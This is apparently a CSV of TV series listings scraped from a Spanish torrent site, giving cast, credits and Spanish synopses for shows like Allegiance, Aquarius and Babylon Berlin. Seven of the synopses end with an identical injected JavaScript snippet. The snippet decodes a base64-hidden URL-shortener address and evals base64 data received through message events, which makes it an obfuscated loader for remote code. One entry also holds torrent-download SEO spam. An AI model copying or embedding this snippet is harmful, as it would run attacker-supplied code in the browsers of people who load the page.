Series main_page_url,Series name,Ficha tecnica,Resumen
https://www.subtorrents1.com/series/allegiance/,Allegiance,"
                       Título original: Allegiance
Año: 2015
País: Estados Unidos
Director: George Nolfi
Guión: George Nolfi
Fotografía: Teodoro Maniaci
Género: Intriga Drama Espionaje
Productora: NBC

Capítulos: 13


Reparto:

Alexandra Peters ... Sarah O'Connor
Annie Ilonzeh ... Julia Marcus
Gavin Stenhouse ... Alex O'Connor
Hope Davis ... Katya O'Connor
Kenneth Choi ... Sam Luttrell
Margarita Levieva ... Natalie O'Connor
Morgan Spector ... Victor Dobrynin
Scott Cohen ... Mark O'Connor						","
Descripcion
'Allegiance' se centra en la figura de Alex O'Connor (Gavin Stenhouse), un joven idealista y agente de la CIA especializado en matería rusa. Aunque su vida parece seguir su cauce habitual, todo cambiará cuando conozca un secreto que cambiará la idealizada imagen que tenía de su familia. Sus padres, Mark (Scott Cohen) y Katya (Hope Davis), son espías rusos encubiertos en EE.UU que fueron desactivados hace décadas. No obstante, una operación terrorista contra los Estados Unidos los devolverá de nuevo a sus puestos y a la realidad.
Años atrás, Katya, de origen ruso, tuvo que reclutar a un empresario estadounidense llamado Mark O'Connor por orden de la KGB. El amor surgió rápidamente y estos les llevo a trazar un acuerdo: mientras Katya siga siendo una ventaja para Rusia en un futuro, se les permitiría a ambos mudarse a EE.UU y casarse. Esto dio lugar a una próspera vida que hizo que se olvidaran completamente de su verdadero propósito. Los últimos acontecimientos les pondrá en una difícil situación por la que tendrán que tomar una clara decisión: traicionar a su país o traicionar a su familia.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/aquarius/,Aquarius,"
                       Título original: Aquarius
Año: 2015
País: Estados Unidos
Director: John McNamara (Creator),  Jonas Pate, Michael Zinberg, Jon Amiel,  Roxann Dawson, John Dahl
Guión: John McNamara, Sera Gamble, Alexandra Cunningham, David Reed
Música: W.G. Snuffy Walden
Fotografía: Lukas Ettlin, Michael Stecher
Productora: NBC
Género: Drama, Crimen, Sectas. Basado en hechos reales

Capítulos: 13


Reparto:

David Duchovny ... Sam Hodiak
Gethin Anthony ... Charles Manson
Brian F. O'Byrne ... Ken Karn
Chance Kelly ... Ed Cutler
Claire Holt ... Charmain Tully
Emma Dumont ... Emma Karn
Gaius Charles ... Bunchy Carter
Grey Damon ... Brian Shafe
Michaela McManus ... Grace Karn
Tara Lynne Barr ... Katie 
","
Descripcion
En 1967, cuando la hija adolescente de un respetado abogado desaparece, el detective de homicidios Sam Hodiak (David Duchovny) comienza a investigar pero pronto descubre que los policías no son bien vistos por los hippies de la época, por lo que recluta la ayuda de Brian Shafe, un rebelde policía encubierto. No pasa mucho tiempo antes de que se encuentren con el líder de una secta que busca a mujeres vulnerables que se unan a su causa. A partir de ahí, siguen el rastro de este hombre en un abismo de drogas, sexo y asesinatos. Drama policíaco de trece episodios que explora los inicios del conocido criminal Charles Manson.

"
https://www.subtorrents1.com/series/ancient-aliens/,Ancient Aliens,"
                       Título original: Ancient Aliens
Año: 2009
País: Estados Unidos
Director: Kevin Burns, David Silver
Guión: Richard Monahan, Kody DèShaupe, Kaylan Eggert
Música: Randy Jones
Productora: Prometheus Entertainment
Género: Documental. Ciencia ficción | Extraterrestres


Robert Clotworthy ... Narrador						","
Descripcion
Alienígenas Ancestrales, (Ancient Aliens) serie documental elaborada por ""The History Channel"" sobre paleoastronáutica, más conocida como la teoría de los astronautas en la antigüedad, destaca cómo las antiguas civilizaciones de entonces dejaron reflejado manifiestamente en sus culturas e historia la presencia de visitantes procedentes de las estrellas.
La existencia de la vida extraterrestre ha sido centro de controversia a lo largo de la historia. De hecho, algunas teorías aseguran que los extraterrestres han interactuado con los habitantes de la Tierra en el transcurso de los siglos y han cambiado el curso de la historia humana.
Alienígenas Ancestrales explora 75 millones de años de pruebas contundentes sobre la posible vida de los extraterrestres en el planeta Tierra, abarcando desde la era de los dinosaurios hasta fechas que nos acercan al presente. Principalmente basada en el trabajo del escritor suizo Erich Von Däniken, acompañan a éste, una nueva fuente de investigadores y científicos interesados en divulgar esa parte de nuestra extensa historia que aún sigue oculta.
"
https://www.subtorrents1.com/series/a-confession/,A Confession,"
                       Título original
A Confession (TV Series)
Año
2019
País
Reino Unido Reino Unido
Dirección
Paul Andrew Williams
Guion
Jeff Pope
Música
Niall Byrne
Fotografía
Vanessa Whyte
Reparto
Siobhan Finneran,  Jessica D'Arcy,  Jake Davies,  Daniel Betts,  Martin Freeman, Florence Howard,  Lorna Jones,  Imelda Staunton,  Darcy Vanhinsbergh, Faye McKeever,  Dominic Tighe,  Anna Wilson-Jones,  Owain Arthur, Caroline Bartleet,  David Keeling,  Christopher Fulford,  Simone Lahbib,  Gary Oliver, Ian Puleston-Davies,  David J Biscoe,  Orla Hill,  Joshua Parris,  Jayda Eyles, Karl Farrer,  Evelyn Hoskins,  Jonny Lavelle,  David Michaels,  Dominique Moore, Paul Riddell,  Stephen Samson,  David Nellist,  John Thomson,  Nila Aalia, Liam Akpan,  Esh Alladi,  Kate Ashfield,  Will Barton,  Toni Beard,  Becky Brunning, Jill Buchanan,  Emma Clifford,  Ian Conningham,  Jim Conway,  Charlie Cooper, Matthew Duckett,  Martyn Ellis,  Rufus Gerhardt-Williams,  Diane Halling,  Leigh Kelly, Jefferson King,  Poppy Lawless,  Dan Linney,  Maimie McCoy,  Grace McKenzie, Jane Perry,  Jim Piddock,  Derek Riddell,  Kirris Riviere,  Rachel Shenton, Glenn Webster,  Peter Wight
Productora
Independent Television (ITV) / Urban Myth Films
Género
Serie de TV. Drama | Crimen. Biográfico
","
Descripcion
Sinopsis
El detective superintendente Steve Fulcher trata de atrapar a toda costa al asesino de una mujer, incluso si por ello se ve obligado a perder su carrera y su reputación. 
"
https://www.subtorrents1.com/series/africa/,África,"
                       Africa
Classification: Documentary
Genre: Adventure | Wildlife
Status: New Series
Network: BBC One ( United Kingdom)
Airs: Wednesdays at 09:00 pm
Runtime: 60 Minutes
Premiere: January 02, 2013
Episode Order: 7
País: Reino Unido
Idioma: Inglés 						","
Descripcion
Cara a cara con lo desconocido – continente más salvaje del mundo. David Attenborough lleva a un impresionante viaje a través del continente vasto y diverso de África, ya que nunca se ha visto antes.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/advokaten/,Advokaten,"
                       Título original
    Advokaten (TV Series) 
Año
    2018
Duración
    45 min.
País
    Suecia Suecia
Dirección
    David Berron, Geir Henning Hopland 
Guion
    Karin Gidfors, Michael Hjorth, Jens Lapidus, Charlotte Lesche, Hans Rosenfeldt, Alex Haridi, Jimmy Lindgren, Peter Lindmark, Maria Nygren, Oliver Dixon, Maria Karlsson
Música
    Adam Nordén
Fotografía
    Gaute Gunnari, Johan Helmer
Reparto
    Alexander Karim, Malin Buska, Thomas Bo Larsen, Nicolaj Kopernikus, Johannes Lassen, Sara Hjort Ditlevsen, Liv Mjönes, Henning Valin Jakobsen, Shebly Niavarani, Susanne Storm, Andrea Vagn Jensen, Källa Bie 
Productora
    Coproducción Suecia-Francia; SF Studios Production AB / Viaplay / TV3 Sverige / StudioCanal. Distribuida por StudioCanal
Género
    Serie de TV. Drama. Thriller | Crimen. Venganza 						","
Descripcion
Frank Nordling es un brillante abogado defensor que trabaja a caballo entre Malmö y Copenhague con un enorme trauma desde su infancia cuando presenció junto a su hermana Sarah, una policía de narcóticos de Malmö, como sus padres eran asesinados al explotar violentamente su vehículo.
"
https://www.subtorrents1.com/series/almost-human/,Almost Human,"
                       Título Original: Almost Human
Creador: J. H. Wyman
Producción Ejecutiva: J. H. Wyman, J. J. Abrams y Bryan Burk
Estudio: Warner Bros. Television
Género: Comedia
Temporada: 1ª temporada
Episodios: 13
Fecha de estreno: Noviembre de 2013
Lugar de rodaje: Vancouver
Distribución: Warner
Horario de emisión: Lunes 8.00 p.m.						","
Descripcion
Almost Human es la nueva producción de J.J. Abrams (Revolution, Perdidos) y J.H. Wyman (Fringe, The Mexican), una trepidante serie poliaca ambientada 35 años en el futuro, en una época en la que los policías tienen como compañeros a androides de aspecto completamente humano y altamente volucionados. En ese ambiente se forjará una extraña e inusual alianza entre un problemático policía, mitad máquina debido a las prótesis que lleva incrustadas en su cuerpo, y un robot medio humano, al que se le reconocen sentimientos que no debería tener. Ambos lucharán juntos contra el crimen en un mundo futurista de alberga desconocidos y terribles peligros.
Es el año 2048. La Tierra es completamente diferente a la que disfrutamos en estos momentos. Lo sabe bien John Kennex (Karl Urban, El señor de los anilos), un agente que sobrevivió a uno de los ataques más catastróficos nunca hechos contra el departamento policial. Después de despertar de un coma de 17 meses, no puede recordar mucho de lo ocurrido, excepto que su compañero fue asesinado, que su novia le dejó después del suceso y que perdió una de sus piernas y ahora cuenta con una prótesis sofisticada y sintética. 
(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/arvingerne/,Arvingerne,"
                       Título original: Arvingerne 
Año: 2014
País: Dinamarca
Director: Maya Ilsøe (Creator),  Pernilla August,  Louise Friedberg,  Jesper Christensen,  Heidi Maria Faisst,  Mads Kamp Thulstrup
Guión: Maya Ilsøe, Maja Jul Larsen, Anders Frithiof August, Per Daumiller, Lolita Belstar, Karina Dam, Lasse Kyed Rasmussen
Música: Magnus Jarlbo, Sebastian Öberg
Productora: Emitida por la cadena DR1; Danmarks Radio (DR)
Género: Drama | Familia 

Temporada: 1
Capítulos:10 

Reparto:

Trine Dyrholm ... Gro Grønnegaard
Carsten Bjørnlund ... Frederik Grønnegaard
Mikkel Boe Følsgaard ... Emil Grønnegaard
Marie Bach Hansen ... Signe Larsen
Jesper Christensen ... Thomas Konrad
Kenneth M. Christensen ... Andreas Baggesen
Lene Maria Christensen ... Solveig Riis Grønnegaard
Trond Espen Seim ... Robert Eliassen						","
Descripcion
Arvingerne (The Legacy) es una nueva serie danesa producida por la cadena DR, creada por el extraordinario equipo detras de los éxitos Forbrydelsen y Borgen. Es una serie dramática que sigue la historia de una familia danesa que vive en el sur del país, siendo una granja familiar el escenario de la trama.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/about-a-boy/,About a Boy,"
                       Título Original: About A Boy
Creador: Jason Katims
Producción Ejecutiva: Jason Katims, Jon Favreau, Tim Bevan, Eric Fellner, Liza Chasin, Robert De Niro y Jane Rosenthal
Estudio: Universal Television
Género: Comedia
Temporada: 1ª temporada
Episodios: 13
Fecha de estreno: 22 de febrero de 2014
Distribución Universal
Horario de emisión Martes 9.00 p.m.

Reparto
David Walton ... Will Freeman
Minnie Driver ... Fiona Brewer
Benjamin Stockham ... Marcus Brewer
Al Madrigal ... Andy
Annie Mumolo ... Laurie						","
Descripcion
Tras escribir una canción que ha sido un éxito, Will Freeman ha pegado el pelotazo y podrá vivir de las rentas el resto de su vida. Está soltero, no trabaja, y es feliz. Pero todo dará un vuelco cuando Fiona, una madre soltera y su encantador hijo de 11 años se muden a la casa de al lado.
"
https://www.subtorrents1.com/series/awake/,Awake,"
                       Título Original: Awake
Creador: Kyle Killen
Producción Ejecutiva: Howard Gordon y Kyle Killen
Estudio: 20th Century Fox Television
Género: Drama
Temporada: 1ª 
Episodios: 13
Fecha de estreno: 1 de marzo de 2012
Horario de emisión Jueves 10.00 p.m.

REPARTO:
Jason Isaacs, Dylan Minnette, Laura Allen, B.D. Wong, Cherry Jones, Michaela McManus, Steve Harris, Wilmer Valderrama						","
Descripcion
En este drama nos encontramos al detective Michael Britten (Jason Isaacs) que sufre un grave accidente de coche junto con su mujer y su hijo. Al despertar descubre que su esposa Hannah (Lauren Allen) había muerto en el accidente, lo que, logicamente, le destroza. Cuando parece recuperarse del trauma despierta en una dimensión paralela en la que también sufrió el accidente pero su esposa ha sobrevivido, mientras que quien muere es su hijo Rex (Dylan Minnette). Comienza entonces a vivir una doble vida entre las dos dimesiones paralelas tanto en el terreno personal como en el laboral.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/babylon-berlin/,Babylon Berlin,"
                       Título original
    Babylon Berlin (TV Series) 
Año
    2017
Duración
    45 min.
País
    Alemania Alemania
Dirección
    Tom Tykwer (Creator), Achim von Borries (Creator), Henk Handloegten (Creator), Tom Tykwer, Achim von Borries, Henk Handloegten 
Guion
    Tom Tykwer, Achim von Borries, Henk Handloegten, Volker Kutscher (Novela: Volker Kutscher)
Música
    Johnny Klimek, Tom Tykwer
Fotografía
    Bernd Fischer, Frank Griebe, Philipp Haberlandt
Reparto
    Waléra Kanischtscheff, Volker Bruch, Liv Lisa Fries, Dmitri Alexandrov, Denis Burgazliev, Oleg Tikhomirov, Anton von Lucke, Roland Wolf, Peter Schneider, Joachim Paul Assböck, Pit Bukowski, Thomas Chemnitz, Christoph Bertram, Matthias Brandt, David Brückner 
Productora
    X Filme Creative Pool / ARD degeto / Beta Film / Sky
Género
    Serie de TV. Drama | Crimen. Años 20 						","
Descripcion
Berlín, 1929. La capital alemana se sitúa como la gran metrópolis de la expresión y la libertad. La ciudad más moderna y viva de una Europa en plena efervescencia que, sin embargo, se tambalea al borde de un cambio inminente. En mitad de esta tensa calma se encuentra Gereon Rath, un detective de la policía de Colonia que acaba de incorporarse a la unidad de antivicio y costumbres de Berlín, localizada en el monumental cuartel general de la policía, para investigar el caso de una red de pornografía relacionado con la mafia rusa.
"
https://www.subtorrents1.com/series/1993/,1993,"
                       Título original
    1993 (TV Series)
Año
    2017
Duración
    60 min.
País
    Italia
Director
    Alessandro Fabbri (Creator), Ludovica Rampoldi (Creator), Stefano Sardo (Creator), Giuseppe Gagliardi
Guion
    Alessandro Fabbri, Nicola Lusuardi, Ludovica Rampoldi, Stefano Sardo
Música
    Davide Dileo
Fotografía
    Michele Paradisi
Reparto
    Stefano Accorsi, Guido Caprino, Miriam Leone, Domenico Diele, Tea Falco, Antonio Gerardi, Ambrogio Avogadri, Giulio Brogi, Gaetano Bruno, Laura Chiatti, Irene Casagrande, Elena Radonicich, Paolo Pierobon, Teco Celio, Vinicio Marchioni, Gianfelice Imparato
Productora
    Sky / Wildside
Género
    Serie de TV. Drama. Thriller | Años 90. Mafia. Política. Crimen. Secuela						","
Descripcion
Secuela de la serie ""1992"". La serie sigue las vivencias de los personajes donde las dejó su precuela, teniendo como trasfondo los principales eventos que marcaron la vida pública italiana durante el año que da nombre a la serie: el proceso ENIMONT, la caida política de Bettino Craxi y del Partido Socialista Italiano, los atentados mafiosos en Florencia, Roma y Milán, los referéndums abrogativos, el final de la Primera República y la entrada en política de Silvio Berlusconi.
"
https://www.subtorrents1.com/series/all-or-nothing-new-zealand-all-blacks/,All or Nothing: New Zealand All Blacks,"
                       Al comienzo de la serie, el equipo se enfrenta al arduo camino por recorrer, después de que sus veteranos superestrellas se retiraron. Con el orgullo de Nueva Zelanda sobre sus hombros, tendrán que unirse para encarar las exigencias físicas del rugby, el ojo crítico de sus fans y los medios, y los retos de la familia y la paternidad, todo mientras luchan por mantener un legado de un siglo en el dominio del deporte. 						","
Descripcion
La temporada de seis episodios, narrada por Taika Waititi, pone a un equipo de grabación junto al equipo de rugby de Nueva Zelanda, los All Blacks, uno de los equipos más exitosos en la historia global del deporte. Por primera vez, los legendarios All Blacks permiten que se les unan cámaras mientras encaran a los formidables leones británicos e irlandeses en un enfrentamiento que ocurre una vez cada 12 años, mientras compiten por el Campeonato 2017 de rugby. La serie ofrece acceso exclusivo a uno de los equipos más dominantes del planeta durante su temporada más discutida y difícil, llevando al público a los vestidores, al campo, y a las vidas del entrenador Steve Hansen y de los aclamados jugadores.
"
https://www.subtorrents1.com/series/anger-management/,Anger Management,"
                       TÍTULO ORIGINAL: Anger Management
AÑO: 2012
PAÍS: Estados Unidos
DIRECTOR: Rob Schiller
GUIÓN: Dave Caplan
PRODUCTORA: Joe Roth Television / Lionsgate Television
GÉNERO: Comedia

REPARTO:
Charlie Sheen, Brett Butler, Derek Richardson, Shawnee Smith, Stephen Taylor, Mike Guzman
","
Descripcion
La serie cuenta la historia de un hombre que protagoniza un altercado y es condenado por un juez a acudir a un psiquiatra para recibir terapia sobre sus problemas de control de la ira.
"
https://www.subtorrents1.com/series/american-gods/,American Gods,"
                       Título original: American Gods (TV Series)
Año: 2017
País: Estados Unidos
Director: Bryan Fuller (Creator),  Michael Green (Creator),  David Slade,  Adam Kane, Vincenzo Natali,  Guillermo Navarro,  Floria Sigismondi,  Craig Zobel
Guion: Bryan Fuller, Michael Green, Robert Richardson (Novela: Neil Gaiman)
Música: Brian Reitzell
Fotografía: Jo Willems
Productora: Emitida por Starz; Fremantle Media North America
Género: Drama, Fantasía

Capítulos: 8


Reparto:

Ricky Whittle ... Shadow Moon
Emily Browning ... Laura Moon / Essie Tregowan
Crispin Glover ... Mr World
Bruce Langley ... Technical Boy
Yetide Badaki ... Bilquis
Pablo Schreiber ... Mad Sweeney
Ian McShane ... Mr. Wednesday						","
Descripcion
Un ex convicto llamado Shadow se encuentra con un misterioso hombre que se hace llamar ""Wednesday"" y que sabe más de lo que parece a primera vista sobre la vida y el pasado de Shadow. Quien se convierte en el compañero de viaje de quien resulta ser uno de los dioses más viejos que tratan de reclutar tropas para combatir a los dioses advenedizos. Basada en la novela de Neil Gaiman.
"
https://www.subtorrents1.com/series/agatha-christies-marple/,Agatha Christie's Marple,"
                       Título original: Marple 
AKA: Agatha Christie's Marple
Año: 2004
Duración: 94 min.
País: Reino Unido
Director: Andy Wilson,  Charles Palmer,  John Strickland,  Tom Shankland,  Edward Hall,  Peter Medak,  Paul Unwin,  Dan Zeff,  Moira Armstrong,  Hettie Macdonald,  Nicholas Renton,  David Moore,  Andy Hay
Guión: Kevin Elyot, Stephen Churchett, Stewart Harcourt, Tom MacRae, Patrick Barlow, Paul Rutman, Russell Lewis (Novela: Agatha Christie)
Música: Dominik Scherrer
Fotografía: Martin Fuhrer
Productora: Chorion / Granada International / WGBH
Género: Intriga 
Temporada: 6
Capítulos: 3

Reparto:
Geraldine McEwan,  
Julia McKenzie
","
Descripcion
'Marple' es una serie de televisión inglesa basada en Miss Marple y otras novelas de misterio de Agatha Christie. El rol principal lo llevó a cabo Geraldine McEwan desde la temporada 1ª hasta la 3ª. A partir de la 4ª, cogió el relevo la actriz Julia McKenzie.
(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/13-reasons-why/,13 Reasons Why,"
                       Título original: 13 Reasons Why
Año: 2017
País: Estados Unidos
Director: Kyle Patrick Alvarez,  Gregg Araki,  Carl Franklin,  Tom McCarthy,  Jessica Yu
Guion: Brian Yorkey, Elizabeth Benjamin, Diana Son, Thomas Higgins, Nathan Jackson, Nathan Louis Jackson, Nic Sheff, Hayley Tyler (Libro: Jay Asher)
Música: Eskmo
Fotografía: Ivan Strasburg, Andrij Parekh
Productora: Netflix / Kicked to the Curb Productions / Anonymous Content / July Moon Productions
Género: Drama. Intriga | Adolescencia. Colegios & Universidad. Acoso escolar

Capítulos: 13


Reparto:

Dylan Minnette ... Clay Jensen
Katherine Langford ... Hannah Baker
Christian Navarro ... Tony Padilla
Brandon Flynn ... Justin Foley
Alisha Boe ... Jessica Davis
Justin Prentice ... Bryce Walker
Miles Heizer ... Alex Standall
Ross Butler ... Zach Dempsey
Devin Druid ... Tyler Down
Amy Hargreaves ... Lainie Jensen
Derek Luke ... Mr. Porter
Kate Walsh ... Mrs. Baker						","
Descripcion
Clay Jensen es un adolescente como cualquier otro. Un día, llega a su casa una misteriosa caja de zapatos para él que carece de remitente. Intrigado, decide abrirla y se encuentra con una serie de cintas de cassette, al parecer grabadas por Hannah Barker, una compañera de clase que se suicidó dos semanas antes. Descargar 13 reasons why Torrent.
Hannah escogió a 13 compañeros para contarles su historia, aquellos 13 a los que culpa de lo que pasó. Gracias a unas instrucciones que dejó en la caja, las cintas deberían llegar a todos ellos para que escucharan una verdad que ninguno quiere oír: las trece razones por las que decidió quitarse la vida.
Algunas variantes de busqueda: thirteen reasons why torrent – 13 reasons why download utorrent – por 13 razones
"
https://www.subtorrents1.com/series/atlanta/,Atlanta,"
                       Título original
    Atlanta (TV Series) 
Año
    2016
Duración
    30 min.
País
    Estados Unidos Estados Unidos
Dirección
    Donald Glover (Creator), Hiro Murai, Donald Glover, Janicza Bravo 
Guion
    Donald Glover, Stephen Glover, Jamal Olori, Stefani Robinson, Fam Udeorji
Música
    Ludwig Göransson
Fotografía
    Christian Sprenger
Reparto
    Donald Glover, Emmett Hunter, Keith Stanfield, Terri Abney, Jane Adams, Lucius Baston, Zazie Beetz, Precious Bright, Deaven Brooks, Jessica A. Caesar, Roy Coulter, Elizabeth Davidovich, Crystal Alicia Garrett, Chris Greene, Derrick Haywood, Key Jones, Isiah Whitlock Jr. 
Productora
    Emitida por FX; FX Productions
Género
    Serie de TV. Comedia. Drama | Música. Hip Hop 						","
Descripcion
En la ciudad de Atlanta, dos primos afroamericanos se meten en el mundo del rap. Su evolución profesional será complicada por su diferente percepción de lo que es el arte, el producto, el éxito y otras cosas.
"
https://www.subtorrents1.com/series/baby-daddy/,Baby Daddy,"
                       Título Original: Baby Daddy
Creador: Dan Berendsen
Producción Ejecutiva: Dan Berendsen
Estudio: ABC Family Original Productions
Género: Comedia
Temporada: 1ª
Episodios: 10
Fecha de estreno: 20 de junio de 2012
Lugar de rodaje: Los Angeles
Distribución: Buenavista
Horario de emisión: Miércoles 8.30 p.m.

Reparto:
Jean-Luc Bilodeau ... Ben
Melissa Peterman ... Bonnie
Derek Theler ... Danny
Chelsea Kane ... Riley
Tahj Mowry ... Tucker						","
Descripcion
Ben (Jean-Luc Bilodeau, Kyle XY) es un joven veinteañero que disfruta felizmente de una despreocupada vida de soltero. Trabaja como camarero en la ciudad de Nueva York mientras trata de averiguar hacia donde quiere dirigirse en la vida. Adora vivir con mejor amigo, Tucker (Tahj Mowry, The Game), con quien comparte piso desde hace años, un joven que siempre está intentando hacer reír a sus amigos. Eso sí, no toques su comida o probablemente en vez de reír, te hará llorar. Junto a ellos vive también el hermano de Ben, Danny (Derek Theler, 90210), un jugador de hockey profesional que se ha mudado recientemente a Nueva York.
Las vidas de estos tres amigos cambiarán por completo cuando llegan a casa un día y se encuentran con un bebé abandonado en su puerta. Tras el shock inicial, descubren que se llama Emma y que es producto de una breve relación de Ben con una ex-novia. Pero por mucho que lo intenta, Ben no puede ni imaginarse quien es la madre desaparecida, lo que le llevará inmediatamente a revisar toda su historia sentimental reciente, partiendo de la posible edad que tiene la pequeña según sus cálculos.
"
https://www.subtorrents1.com/series/a-to-z/,A to Z,"
                       Título original: A to Z 
Año: 2014
País: Estados Unidos
Director: Michael Patrick Jann
Guión: Ben Queen 
Música: Bo Boddie 
Productora: Le Train Train
Género: Comedia 

Temporada: 1 
Capítulos 13

Reparto:

Katey Sagal ... voiced Narrator
Ben Feldman ... Andrew Lofland
Christina Kirk ... Lydia 
Cristin Milioti ... Zelda Vasco
Henry Zebrowski ... Stu
Hong Chau ... Lora
Lenora Crichlow ... Stephie
Nancy Friedrich ... Nancy
Parvesh Cheena ... Dinesh 
","
Descripcion
'A to Z' sigue el día a día de una pareja desde que empiezan a conocerse hasta que, finalmente, la relación se acaba. Esta comedia romántica se centra en una empresa dedicada a las citas por Internet y lo que todo ello conlleva, planteando la siguiente pregunta: ¿existe el destino en las cuestiones amorosas?(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/angie-tribeca/,Angie Tribeca,"
                       Título original: Angie Tribeca
Año: 2016
País: Estados Unidos
Director: Steve Carell, Martha Coolidge, Richie Keen, Jon Poll, Matt Sohn
Guión: Nancy Carell, Steve Carell, Marisa Pinson, Alex J. Reid, Ava Tramer
Productora: Carousel Television
Género: Comedia

Capítulos: 10


Reparto:

Rashida Jones ... Angie Tribeca
Jere Burns ... Chet Atkins
Deon Cole ... DJ Tanner
Hayes MacArthur ... Jay Geils						","
Descripcion
Angie Tribeca (Rashida Jones) es una agente de la policía que lleva en la Unidad de Crímenes de Los Angeles más de 10 años. Este grupo de detectives investigan un crimen y no descansan hasta que se haya hecho justicia…más o menos.

"
https://www.subtorrents1.com/series/back/,Back,"

Título original
    Back (TV Series) 
Año
    2017
Duración
    24 min.
País
    Reino Unido Reino Unido
Director
    Simon Blackwell (Creator), Ben Palmer 
Guion
    Simon Blackwell, Jesse Armstrong, Ian Martin, Tony Roche, Will Smith
Música
    Oli Julian
Fotografía
    John Sorapure
Reparto
    David Mitchell, Robert Webb, Louise Brealey, Penny Downie, Jessica Gunning, Oliver Maltman, Geoffrey McGivern, Olivia Poulet, Caius Luckyn-Malone, Sebastian Patterson, Matthew Holness 
Productora
    Big Talk Productions / That Mitchell, Webb Company
Género
    Serie de TV. Comedia 						","
Descripcion
sigue a los hermanos de crianza Stephen (David Mitchell) y Andrew (Robert Webb), que se han alejado, mientras prometen hacerse cargo del negocio familiar tras la muerte de su padre.
"
